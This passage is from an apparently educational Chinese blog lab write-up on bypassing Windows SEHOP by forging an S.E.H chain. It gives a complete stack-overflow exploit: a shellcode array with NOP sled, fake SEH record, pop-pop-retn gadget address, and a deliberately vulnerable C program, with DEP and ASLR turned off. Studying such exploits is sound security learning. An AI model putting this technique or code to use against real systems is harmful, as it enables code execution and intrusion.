占据， kernel32.dll 的位置由第二个变为第三个，所以要对 shellcode 做出相应修改。在原来 shellcode 的第 52 个字节之后插入 “\x8B\x09”，该机器码对应的汇编语句为MOV ECX,[ECX]，来让程序多跳转一次，定位到 kernel32.dll。修改后的对话框 shellcode 如下。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Shellcode=</span><br><span class="line"><span class="string">&quot;\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C&quot;</span></span><br><span class="line"><span class="string">&quot;\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53&quot;</span></span><br><span class="line"><span class="string">&quot;\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B&quot;</span></span><br><span class="line"><span class="string">&quot;\x49\x1C\x8B\x09&quot;</span></span><br><span class="line"><span class="string">&quot;\x8B\x09&quot;</span> <span class="comment">//在这增加机器码\x8B\x09，它对应的汇编为 mov ecx,[ecx]</span></span><br><span class="line"><span class="string">&quot;\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95&quot;</span></span><br><span class="line"><span class="string">&quot;\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59&quot;</span></span><br><span class="line"><span class="string">&quot;\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A&quot;</span></span><br><span class="line"><span class="string">&quot;\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75&quot;</span></span><br><span class="line"><span class="string">&quot;\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03&quot;</span></span><br><span class="line"><span class="string">&quot;\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB&quot;</span></span><br><span class="line"><span class="string">&quot;\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50&quot;</span></span><br><span class="line"><span class="string">&quot;\x53\xFF\x57\xFC\x53\xFF\x57\xF8&quot;</span></span><br></pre></td></tr></table></figure><p>（2）禁用程序的 DEP，通过取消程序的/NXCOMPAT 链接选项。</p><p><img src="/2022/06/28/S-E-H-%E7%BB%88%E6%9E%81%E9%98%B2%E6%8A%A4%EF%BC%9ASEHOP/image-20220628130325139.png" alt="image-20220628130325139"></p><h1 id="伪造-seh-链表"><a class="markdownIt-Anchor" href="#伪造-seh-链表"></a> 伪造 S.E.H 链表</h1><h2 id="实验原理"><a class="markdownIt-Anchor" href="#实验原理"></a> 实验原理</h2><p><img src="/2022/06/28/S-E-H-%E7%BB%88%E6%9E%81%E9%98%B2%E6%8A%A4%EF%BC%9ASEHOP/image-20220628142531628.png" alt="image-20220628142531628"></p><p>为了提高溢出的成功率，我们在本实验中关闭系统的 ASLR，因为伪造 S.E.H 链时需要用到 FinalExceptionHandler 指向的地址。所以这里只讨论这种方法理论上的可行性。</p><p>伪造 S.E.H 链绕过 SEHOP 所需条件：<br>（ 1）图 14.5.1 中的 0xXXXXXXXX 地址必须指向当前栈中，而且必须能够被 4 整除。<br>（ 2） 0xXXXXXXXX 处存放的异常处理记录作为 S.E.H 链的最后一项，其异常处理函数指针必须指向终极异常处理函数。<br>（ 3）突破 SEHOP 检查后，溢出程序还需搞定 SafeSEH。</p><p>为了避免实验过于复杂，本次实验我们在 “利用未启用 SafeSEH 模块绕过 SafeSEH” 的基础 上 进 行 ， 所以不用再考虑 SafeSEH 的问题，只需确定 0xXXXXXXXX 的值和 FinalExceptionHandler 指向的地址。</p><h2 id="实验代码"><a class="markdownIt-Anchor" href="#实验代码"></a> 实验代码：</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&quot;stdafx.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="type">char</span> shellcode[]=</span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\x14\xFF\x12\x00&quot;</span><span class="comment">//address of last seh record</span></span><br><span class="line">    <span class="string">&quot;\x68\x10\x12\x11&quot;</span><span class="comment">//address of pop pop retn in No_SafeSEH module</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C&quot;</span></span><br><span class="line">    <span class="string">&quot;\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53&quot;</span></span><br><span class="line">    <span class="string">&quot;\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B&quot;</span></span><br><span class="line">    <span class="string">&quot;\x49\x1C\x8B\x09&quot;</span></span><br><span class="line">    <span class="string">&quot;\x8B\x09&quot;</span><span class="comment">//在这增加机器码\x8B\x09，它对应的汇编为 mov ecx,[ecx]</span></span><br><span class="line">    <span class="string">&quot;\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95&quot;</span></span><br><span class="line">    <span class="string">&quot;\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59&quot;</span></span><br><span class="line">    <span class="string">&quot;\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A&quot;</span></span><br><span class="line">    <span class="string">&quot;\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75&quot;</span></span><br><span class="line">    <span class="string">&quot;\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03&quot;</span></span><br><span class="line">    <span class="string">&quot;\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB&quot;</span></span><br><span class="line">    <span class="string">&quot;\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50&quot;</span></span><br><span class="line">    <span class="string">&quot;\x53\xFF\x57\xFC\x53\xFF\x57\xF8\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\xFF\xFF\xFF\xFF&quot;</span><span class="comment">// the fake seh record</span></span><br><span class="line">    <span class="string">&quot;\x75\xA8\xF7\x77&quot;</span></span><br><span class="line">    ;</span><br><span class="line">DWORD <span class="title function_">MyException</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;There is an exception&quot;</span>);</span><br><span class="line">    getchar();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">test</span><span class="params">(<span class="type">char</span> * input)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> str[<span class="number">200</span>];</span><br><span class="line">    <span class="built_in">memcpy</span>(str,input,<span class="number">412</span>);</span><br><span class="line">    <span class="type">int</span> zero=<span class="number">0</span>;</span><br><span class="line">    __try</span><br><span class="line">    &#123;</span><br><span class="line">    zero=<span class="number">1</span>/zero;</span><br><span class="line">    &#125;</span><br><span class="line">    __except(MyException())</span><br><span class="line">    &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> _tmain(<span class="type">int</span> argc, _TCHAR* argv[])</span><br><span class="line">&#123;</span><br><span class="line">    HINSTANCE hInst = LoadLibrary(_T(<span class="string">&quot;SEH_NOSafeSEH_JUMP.dll&quot;</span>));<span class="comment">//load No_SafeSEH module</span></span><br><span class="line">    <span class="type">char</span> str[<span class="number">200</span>];</span><br><span class="line">    test(shellcode);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="实验思路"><a class="markdownIt-Anchor" href="#实验思路"></a> 实验思路：</h2><p>（ 1）通过未启用 SafeSEH 的 SEH_NOSaeSEH_JUMP.dll 来绕过 SafeSEH。<br>（ 2）通过伪造 S.E.H 链，造成 S.E.H 链未被破坏的假象来绕过 SEHOP。<br>（ 3） SEH_NOSafeSEH 中的 test 函数通过向 str 复制超长字符串造成 str 溢出，进而覆盖程序的 S.E.H 信息。<br>（ 4）使用 SEH_NOSafeSEH_JUMP.DLL 中的 “pop pop retn” 指令地址覆盖异常处理函数地址，然后通过制造除 0 异常，将程序转入异常处理。通过劫持异常处理流程，程序转入 SEH_NOSaeSEH_JUMP.DLL 中执行“pop pop retn” 指令，在执行 retn 后程序转入 shellcode 执行。</p><table><thead><tr><th></th><th>推荐使用的环境</th><th>备 注</th></tr></thead><tbody><tr><td>操作系统 W</td><td>Windows 7</td><td></td></tr><tr><td>EXE 编译器</td><td>Visual Studio 2008</td><td></td></tr><tr><td>DLL 编译器</td><td>VC++ 6.0</td><td>将 dll 基址设置为 0x11120000</td></tr><tr><td>系统 SEHOP</td><td>启用</td><td></td></tr><tr><td>程序 DEP</td><td>关闭</td><td></td></tr><tr><td>系统 ASLR</td><td>关闭</td><td></td></tr><tr><td>编译选项</td><td>禁用优化选项</td><td></td></tr><tr><td>build 版本</td><td>release 版本</td><td></td></tr></tbody></table><blockquote><p>说明：实验中的 FinalExceptionHandler 指向的地址可能在您的系统中会有所变化</p></blockquote><h2 id="实验步骤-2"><a class="markdownIt-Anchor" href="#实验步骤-2"></a> 实验步骤</h2><h3 id="先启用-sehop"><a class="markdownIt-Anchor" href="#先启用-sehop"></a> 先启用 SEHOP</h3><p>把 MajorLinkerVersion 和 MinorLinkerVersion 的值分别设为 0x06 和 0x00，排除上一个实验的影响。<br><img src="/2022/06/28/S-E-H-%E7%BB%88%E6%9E%81%E9%98%B2%E6%8A%A4%EF%BC%9ASEHOP/image-20220628145516662.png" alt="image-20220628145516662"></p><h3 id="确定-finalexceptionhandler-指向的地址"><a class="markdownIt-Anchor" href="#确定-finalexceptionhandler-指向的地址"></a> 确定 FinalExceptionHandler 指向的地址</h3><p>用 OllyDbg 加载好程序后直接观察堆栈的底部就可以看到 FinalExceptionHandler 指向的地址，本次实验中地址为 0x770DAB2D。</p><p><img src="/2022/06/28/S-E-H-%E7%BB%88%E6%9E%81%E9%98%B2%E6%8A%A4%EF%BC%9ASEHOP/image-20220628151551454.png" alt="image-20220628151551454"></p><h3 id="伪造-seh-链"><a class="markdownIt-Anchor" href="#伪造-seh-链"></a> 伪造 S.E.H 链</h3><h4 id="先看一下-seh-的覆盖情况"><a class="markdownIt-Anchor" href="#先看一下-seh-的覆盖情况"></a> 先看一下 S.E.H 的覆盖情况</h4><p>按 F9 键让程序运行，程序会在除零异常发生时中断。</p><p><img src="/2022/06/28/S-E-H-%E7%BB%88%E6%9E%81%E9%98%B2%E6%8A%A4%EF%BC%9ASEHOP/image-20220628152251152.png" alt="image-20220628152251152"></p><p>由上图可得，str[]的起始地址为 0x0012FD80。</p><p><img src="/2022/06/28/S-E-H-%E7%BB%88%E6%9E%81%E9%98%B2%E6%8A%A4%EF%BC%9ASEHOP/image-20220628152504174.png" alt="image-20220628152504174"></p><p>位于 0x0012FE58 处的栈顶异常处理记录已经被覆盖为 0x90909090，S.E.H 链已经被破坏。前面需用 216 个 0x90 填充。</p><h4 id="确定伪造的异常处理记录放置位置"><a class="markdownIt-Anchor" href="#确定伪造的异常处理记录放置位置"></a> 确定伪造的异常处理记录放置位置</h4><p>首先，不能直接使用程序自带的终极异常处理记录，因为该记录位于 0x0012FFE4，它作为机器码被执行时，会影响程序正常运行，您可自行调试观察一下。</p><p>不如在距离弹出对话框机器码结束最近的内存放置伪造的异常处理记录，当然这个地址不仅可以被 4 整除而且还不能影响程序的执行，本次实验选择 0x0012FF14。</p><h4 id="部署-shellcode"><a class="markdownIt-Anchor" href="#部署-shellcode"></a> 部署 shellcode</h4><p><img src="/2022/06/28/S-E-H-%E7%BB%88%E6%9E%81%E9%98%B2%E6%8A%A4%EF%BC%9ASEHOP/image-20220628180107496.png" alt="image-20220628180107496"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> shellcode[]=</span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\x14\xFF\x12\x00&quot;</span><span class="comment">//address of last seh record</span></span><br><span class="line">    <span class="string">&quot;\x68\x10\x12\x11&quot;</span><span class="comment">//address of pop pop retn in No_SafeSEH module</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C&quot;</span></span><br><span class="line">    <span class="string">&quot;\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53&quot;</span></span><br><span class="line">    <span class="string">&quot;\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B&quot;</span></span><br><span class="line">    <span class="string">&quot;\x49\x1C\x8B\x09&quot;</span></span><br><span class="line">    <span class="string">&quot;\x8B\x09&quot;</span><span class="comment">//在这增加机器码\x8B\x09，它对应的汇编为 mov ecx,[ecx]</span></span><br><span class="line">    <span class="string">&quot;\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95&quot;</span></span><br><span class="line">    <span class="string">&quot;\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59&quot;</span></span><br><span class="line">    <span class="string">&quot;\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A&quot;</span></span><br><span class="line">    <span class="string">&quot;\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75&quot;</span></span><br><span class="line">    <span class="string">&quot;\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03&quot;</span></span><br><span class="line">    <span class="string">&quot;\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB&quot;</span></span><br><span class="line">    <span class="string">&quot;\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50&quot;</span></span><br><span class="line">    <span class="string">&quot;\x53\xFF\x57\xFC\x53\xFF\x57\xF8\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\xFF\xFF\xFF\xFF&quot;</span><span class="comment">// the fake seh record</span></span><br><span class="line">    <span class="string">&quot;\x75\xA8\xF7\x77&quot;</span></span><br><span class="line">    ;</span><br></pre></td></tr></table></figure><p>编译运行，就能看到 ”failwest“ 对话框了。</p><p><img src="/2022/06/28/S-E-H-%E7%BB%88%E6%9E%81%E9%98%B2%E6%8A%A4%EF%BC%9ASEHOP/image-20220628175704598.png" alt="image-20220628175704598"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[toc]&lt;/p&gt;
&lt;h1 id=&quot;sehop-的原理&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#sehop-的原理&quot;&gt;&lt;/a&gt; SEHOP 的原理&lt;/h1&gt;
&lt;p&gt;SEHOP（Structured Exception Handling Ov</summary>
      
    
    
    
    <category term="0day安全" scheme="https://www.rgzzplus.com/categories/0day%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="SEHOP" scheme="https://www.rgzzplus.com/tags/SEHOP/"/>
    
  </entry>
  
</feed>
